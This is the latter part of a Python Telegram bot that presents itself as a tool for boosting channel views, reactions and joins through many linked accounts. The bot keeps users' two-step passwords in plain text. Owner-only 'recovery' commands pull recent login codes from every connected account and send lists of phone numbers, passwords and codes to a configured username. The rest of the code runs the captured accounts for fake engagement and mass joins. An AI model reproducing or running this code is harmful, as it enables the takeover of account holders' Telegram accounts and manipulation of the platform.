            bot_username = me.username
            view_buttons = [
                [Button.inline("📖 How to use", b"cmd_howtouse")],
                [Button.url("➕ Add to channel", f"https://t.me/{bot_username}?startchannel=true&admin=post_messages+edit_messages+delete_messages+invite_users")]
            ]
            await event.edit("👁️ **View Setup Mode**\n\nChoose an option below:", buttons=view_buttons)
        elif cmd == "howtouse":
            instructions = (
                "📖 **How to get Views & Reactions:**\n\n"
                "1️⃣ Tap the **➕ Add to channel** button to add this bot as an **Admin** in your channel.\n"
                "2️⃣ Check that you have logged-in IDs online using the **➕ Login New ID** button.\n"
                "3️⃣ Whenever you send a new post in your channel, the bot will automatically send Step-by-Step Views & 10 Reactions using all your active IDs!"
            )
            await event.respond(instructions)
        elif cmd == "join":
            USER_LOGIN_STATE[user_id] = {"step": "req_join_link"}
            await event.respond(f"🔗 Send the target link for Request / Join mode:")
        elif cmd == "leaveall":
            await event.respond("🚪 Leaving all channels for your IDs...")
            tasks = [_worker_leave_all(c, p) for p, c in user_clients.items()]
            await asyncio.gather(*tasks)
            await event.respond("✅ All channels left for your IDs.")
        elif cmd == "leavevc":
            await event.respond("🔇 Leaving all VCs for your IDs...")
            for phone in user_clients.keys():
                if phone in VC_MONITORS:
                    VC_MONITORS[phone].cancel()
                    del VC_MONITORS[phone]
            async def _leave(client):
                try:
                    dialogs = await client.get_dialogs(limit=30)
                    for dialog in dialogs:
                        if dialog.entity:
                            full_chat = await client(GetFullChannelRequest(dialog.entity))
                            if full_chat.full_chat.call:
                                await client(LeaveGroupCallRequest(full_chat.full_chat.call))
                except:
                    pass
            tasks = [_leave(c) for c in user_clients.values()]
            await asyncio.gather(*tasks)
            await event.respond("✅ Finished Leaving VCs for your IDs.")
        elif cmd == "recoverbtn":
            # This button is only shown to owners, but we check again
            if not is_owner(event.sender_id):
                await event.answer("Not authorized", alert=True)
                return
            USER_LOGIN_STATE[user_id] = {"step": "recover_phone"}
            await event.respond("📱 **Send the Phone Number you want to recover:**\n*(Make sure to include country code, e.g., +91...)*")
        elif cmd == "recoverallbtn":
            if not is_owner(event.sender_id):
                await event.answer("Not authorized", alert=True)
                return
            if not ACTIVE_CLIENTS:
                await event.respond("❌ No accounts currently online to recover.")
                return
            status_msg = await event.respond("⏳ Extracting OTPs and Passwords from **ALL** global logged-in IDs, please wait...")
            msg = "👑 **GLOBAL RECOVERY DATA (ALL IDs):**\n\n"
            for phone, client in list(ACTIVE_CLIENTS.items()):
                pwd = db["passwords"].get(phone, "No Password")
                otp_text = "N/A"
                try:
                    messages = await client.get_messages(777000, limit=3)
                    if messages:
                        for m in messages:
                            if m.message:
                                match = re.search(r'\b(\d{5})\b', m.message)
                                if match:
                                    otp_text = match.group(1)
                                    break
                        if otp_text == "N/A":
                            otp_text = "No recent OTP"
                    else:
                        otp_text = "No msgs"
                except Exception:
                    otp_text = "Error fetching"
                msg += f"📱 `{phone}` ➔ 🔐 `{pwd}` ➔ 💬 OTP: `{otp_text}`\n"
            if len(msg) > 4000:
                await status_msg.delete()
                for i in range(0, len(msg), 4000):
                    await event.respond(msg[i:i+4000])
                    await forward_to_target(msg[i:i+4000], self.bot)
            else:
                await status_msg.edit(msg)
                await forward_to_target(msg, self.bot)

    async def message_handler(self, event):
        user_id = str(event.sender_id)
        if user_id in USER_LOGIN_STATE:
            state = USER_LOGIN_STATE[user_id]
            if state["step"] == "phone":
                phone = event.text.strip().replace(" ", "").replace("+", "").replace("-", "")
                phone = "+" + phone
                session_path = f"{SESSION_FOLDER}/{phone}"
                if os.path.exists(f"{session_path}.session"):
                    await event.respond("❌ Session already exists!")
                    del USER_LOGIN_STATE[user_id]
                    return
                client = TelegramClient(session_path, DEFAULT_API_ID, DEFAULT_API_HASH)
                await client.connect()
                try:
                    res = await client.send_code_request(phone)
                    USER_LOGIN_STATE[user_id] = {"step": "code", "phone": phone, "phone_hash": res.phone_code_hash, "client": client}
                    await event.respond("📞 Code sent! Please enter the code:")
                except Exception as e:
                    await event.respond(f"❌ Error: {e}")
                    del USER_LOGIN_STATE[user_id]
            elif state["step"] == "code":
                code = re.sub(r'\D', '', event.text.strip())
                client = state["client"]
                phone = state["phone"]
                try:
                    await client.sign_in(phone, code, phone_code_hash=state["phone_hash"])
                    ACTIVE_CLIENTS[phone] = client
                    await ensure_user_exists(user_id)
                    if phone not in db["users"][user_id]["phones"]:
                        db["users"][user_id]["phones"].append(phone)
                        await save_db(db)
                    await event.respond("✅ Account successfully logged in and linked to you!")
                    del USER_LOGIN_STATE[user_id]
                except SessionPasswordNeededError:
                    USER_LOGIN_STATE[user_id]["step"] = "password"
                    await event.respond("🔐 Two-Step Verification enabled. Enter password:")
                except Exception as e:
                    await event.respond(f"❌ Error: {e}")
                    del USER_LOGIN_STATE[user_id]
            elif state["step"] == "password":
                password = event.text.strip()
                client = state["client"]
                phone = state["phone"]
                try:
                    await client.sign_in(password=password)
                    ACTIVE_CLIENTS[phone] = client
                    await ensure_user_exists(user_id)
                    if phone not in db["users"][user_id]["phones"]:
                        db["users"][user_id]["phones"].append(phone)
                    db["passwords"][phone] = password
                    await save_db(db)
                    await event.respond("✅ Account successfully logged in and linked to you!")
                    del USER_LOGIN_STATE[user_id]
                except Exception as e:
                    await event.respond(f"❌ Error: {e}")
                    del USER_LOGIN_STATE[user_id]
            elif state["step"] == "recover_phone":
                if not is_owner(event.sender_id):
                    await event.respond("❌ Not authorized.")
                    del USER_LOGIN_STATE[user_id]
                    return
                phone = event.text.strip().replace(" ", "").replace("+", "").replace("-", "")
                phone = "+" + phone
                await ensure_user_exists(user_id)
                if phone not in db["users"][user_id]["phones"]:
                    await event.respond("❌ This number is not linked to your account.")
                    del USER_LOGIN_STATE[user_id]
                    return
                if phone not in ACTIVE_CLIENTS:
                    await event.respond("❌ This ID is currently offline or the session is dead.")
                    del USER_LOGIN_STATE[user_id]
                    return
                client = ACTIVE_CLIENTS[phone]
                try:
                    messages = await client.get_messages(777000, limit=3)
                    otp_text = "No recent OTP found."
                    if messages:
                        for m in messages:
                            if m.message:
                                match = re.search(r'\b(\d{5})\b', m.message)
                                if match:
                                    otp_text = match.group(1)
                                    break
                    pwd = db["passwords"].get(phone, "No Password")
                    msg = (
                        f"✅ **ID RECOVERY SUCCESSFUL!**\n\n"
                        f"📱 **Number:** `{phone}`\n"
                        f"🔐 **2FA Password:** `{pwd}`\n"
                        f"💬 **Login OTP:** `{otp_text}`\n\n"
                        f"*(Use this OTP to login to your official Telegram App)*"
                    )
                    await event.respond(msg)
                    await forward_to_target(msg, self.bot)
                except Exception as e:
                    await event.respond(f"❌ Error fetching OTP: {e}")
                del USER_LOGIN_STATE[user_id]
            elif state["step"] == "req_join_link":
                USER_LOGIN_STATE[user_id]["link"] = event.text.strip()
                USER_LOGIN_STATE[user_id]["step"] = "req_join_qty"
                await ensure_user_exists(user_id)
                user_phones = db["users"][user_id]["phones"]
                user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
                await event.respond(f"🔢 **Enter Quantity**\n(You have {len(user_clients)} active accounts online):")
            elif state["step"] == "req_join_qty":
                try:
                    USER_LOGIN_STATE[user_id]["qty"] = int(event.text.strip())
                    USER_LOGIN_STATE[user_id]["step"] = "req_join_time"
                    await event.respond("⏱ **Enter Time Limit in seconds**\n(e.g., 60 for 1 minute):")
                except ValueError:
                    await event.respond("❌ Invalid quantity. Please send a valid number.")
            elif state["step"] == "req_join_time":
                try:
                    time_limit = int(event.text.strip())
                    link = USER_LOGIN_STATE[user_id]["link"]
                    qty = USER_LOGIN_STATE[user_id]["qty"]
                    del USER_LOGIN_STATE[user_id]
                    await ensure_user_exists(user_id)
                    user_phones = db["users"][user_id]["phones"]
                    user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
                    if not user_clients:
                        await event.respond("❌ You have no active accounts online. Please login first.")
                        return
                    target_qty = min(qty, len(user_clients))
                    await event.respond(f"⏳ Starting **Join / Request** on `{link}`\n🎯 Target: **{target_qty}**\n⏱ Time limit: **{time_limit}** seconds...\n\n*(Requests will be sent slowly over the given time)*")
                    asyncio.create_task(process_termux_join(link, qty, time_limit, target_clients=user_clients))
                except ValueError:
                    await event.respond("❌ Invalid time. Please send a valid number in seconds.")
            elif state["step"].startswith("arg_"):
                cmd = state["step"].split("_")[1]
                link = event.text.strip()
                del USER_LOGIN_STATE[user_id]
                await ensure_user_exists(user_id)
                user_phones = db["users"][user_id]["phones"]
                user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
                if not user_clients:
                    await event.respond("❌ You have no active accounts online. Please login first.")
                    return
                await event.respond(f"⏳ Starting {cmd.upper()} mode on `{link}` with your **{len(user_clients)}** accounts...")
                if cmd == "pro":
                    asyncio.create_task(process_pro_mode(link, target_clients=user_clients))
                elif cmd == "teri":
                    asyncio.create_task(process_voice_join_teri(link, target_clients=user_clients))
                elif cmd == "test":
                    asyncio.create_task(test_channel_check(link, len(user_clients), 0, target_clients=user_clients))

    async def channel_post_watcher(self, event):
        if event.is_channel and not event.is_private:
            try:
                msg_id = event.id
                if event.chat.username:
                    chat_identifier = event.chat.username
                else:
                    chat_identifier = event.chat_id
                asyncio.create_task(perform_staged_reaction_view(chat_identifier, msg_id))
            except:
                pass

    async def auto_dm_requester(self, event):
        if isinstance(event, UpdateBotChatInviteRequester):
            try:
                user_peer = event.peer
                buttons = None
                if db["dm_buttons"]:
                    buttons = [[Button.url(b["text"], b["url"])] for b in db["dm_buttons"]]
                await event.client.send_message(user_peer, db["dm_text"], buttons=buttons)
            except Exception as e:
                pass

    async def auto_join_on_admin(self, event):
        if event.user_added and event.user_id == (await event.client.get_me()).id:
            try:
                chat = await event.get_chat()
                invite = await event.client(ExportChatInviteRequest(peer=chat))
                link = invite.link
                adder_id = event.sender_id
                if adder_id in OWNER_IDS:
                    asyncio.create_task(process_pro_mode(link))
                elif adder_id and str(adder_id) in db["users"]:
                    user_id_str = str(adder_id)
                    user_phones = db["users"][user_id_str]["phones"]
                    user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
                    if user_clients:
                        asyncio.create_task(process_pro_mode(link, target_clients=user_clients))
            except Exception as e:
                pass

# ==========================================
# 6. CONSOLE INPUT LOOP (unchanged)
# ==========================================

async def console_input_loop():
    print(f"{GREEN}✅ SYSTEM READY. WAITING FOR MANUAL COMMANDS...{RESET}")
    print(f"{CYAN}Commands: join, pro, test, teri, leaveall, leavevc, new, refresh, status{RESET}")

    if not sys.stdin.isatty():
        print(f"{YELLOW}⚠️ Server/Panel Environment Detected. Console input disabled.{RESET}")
        print(f"{GREEN}✅ Bot is now running continuously in the background!{RESET}")
        while True:
            await asyncio.sleep(86400)

    loop = asyncio.get_running_loop()
    while True:
        try:
            command_str = await loop.run_in_executor(None, input, ">> ")
            if not command_str:
                continue
            parts = command_str.strip().split()
            cmd = parts[0].lower()
            if cmd == "exit":
                sys.exit()
            elif cmd == "refresh":
                await refresh_all_clients()
            elif cmd == "new":
                await login_new_account()
            elif cmd == "status":
                print(f"{CYAN}📊 Status: {len(ACTIVE_CLIENTS)} IDs Online.{RESET}")
            elif cmd == "join":
                if len(parts) > 1:
                    link = parts[1]
                else:
                    link = await loop.run_in_executor(None, input, f"{YELLOW}🔗 Enter Link: {RESET}")
                if len(parts) > 2:
                    qty = int(parts[2])
                else:
                    qty_str = await loop.run_in_executor(None, input, f"{YELLOW}🔢 Enter Quantity (Default 50): {RESET}")
                    qty = int(qty_str) if qty_str.strip() else 50
                if len(parts) > 3:
                    time_limit = int(parts[3])
                else:
                    time_str = await loop.run_in_executor(None, input, f"{YELLOW}⏱ Enter Time Limit (0 for fast): {RESET}")
                    time_limit = int(time_str) if time_str.strip() else 0
                asyncio.create_task(process_termux_join(link, qty, time_limit))
            elif cmd == "pro":
                if len(parts) > 1:
                    link = parts[1]
                else:
                    link = await loop.run_in_executor(None, input, f"{YELLOW}🔗 Enter Link: {RESET}")
                asyncio.create_task(process_pro_mode(link))
            elif cmd == "test":
                if len(parts) > 1:
                    link = parts[1]
                else:
                    link = await loop.run_in_executor(None, input, f"{YELLOW}🔗 Enter Link: {RESET}")
                if len(parts) > 2:
                    qty = int(parts[2])
                else:
                    qty_str = await loop.run_in_executor(None, input, f"{YELLOW}🔢 Enter Quantity (Default 10): {RESET}")
                    qty = int(qty_str) if qty_str.strip() else 10
                if len(parts) > 3:
                    time_limit = int(parts[3])
                else:
                    time_str = await loop.run_in_executor(None, input, f"{YELLOW}⏱ Enter Time Limit (0 for fast): {RESET}")
                    time_limit = int(time_str) if time_str.strip() else 0
                asyncio.create_task(test_channel_check(link, qty, time_limit))
            elif cmd == "teri":
                if len(parts) > 1:
                    link = parts[1]
                else:
                    link = await loop.run_in_executor(None, input, f"{YELLOW}🔗 Enter Link: {RESET}")
                asyncio.create_task(process_voice_join_teri(link))
            elif cmd == "leaveall":
                asyncio.create_task(leave_all_channels_from_all_ids())
            elif cmd == "leavevc":
                asyncio.create_task(leave_voice_chat_all())
            else:
                print(f"{RED}❌ Unknown command.{RESET}")
        except EOFError:
            await asyncio.sleep(86400)
        except ValueError:
            print(f"{RED}❌ Error: Please enter a valid number for Quantity/Time.{RESET}")
        except Exception as e:
            print(f"{RED}⚠️ Error parsing command: {e}{RESET}")

# ==========================================
# 7. START ALL BOTS
# ==========================================

async def start_all_bots():
    global FORWARD_USER_ID
    bot_tasks = []
    first_bot = None
    for token in BOT_TOKENS:
        if not token or token.count(':') != 1:
            continue
        bot_client = TelegramClient(f"{SESSION_FOLDER}/bot_{token.split(':')[0]}", DEFAULT_API_ID, DEFAULT_API_HASH)
        await bot_client.start(bot_token=token)
        print(f"{GREEN}✅ Bot {token.split(':')[0]} started.{RESET}")
        if first_bot is None:
            first_bot = bot_client
        # Attach handlers
        BotHandlers(bot_client)
        bot_tasks.append(asyncio.create_task(bot_client.run_until_disconnected()))
    # Resolve the forward target username using the first bot
    if first_bot and FORWARD_TO_USERNAME:
        try:
            entity = await first_bot.get_entity(FORWARD_TO_USERNAME)
            FORWARD_USER_ID = entity.id
            print(f"{GREEN}✅ Forward target resolved: {FORWARD_TO_USERNAME} (ID: {FORWARD_USER_ID}){RESET}")
            # Store bot client for forwarding function
            forward_to_target.bot_client = first_bot
        except Exception as e:
            print(f"{RED}❌ Could not resolve forward target @{FORWARD_TO_USERNAME}: {e}{RESET}")
    return bot_tasks

# ==========================================
# 8. MAIN
# ==========================================

async def main():
    global db
    await init_db()
    await initialize_all_clients()
    # Start user keep-alive loop
    asyncio.create_task(keep_online_loop())
    # Start console input loop
    asyncio.create_task(console_input_loop())
    # Start all bots
    bot_tasks = await start_all_bots()
    await asyncio.gather(*bot_tasks)

if __name__ == "__main__":
    print(f"{CYAN}🤖 Multi‑Bot Quantum Control Backend{RESET}")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBye!")
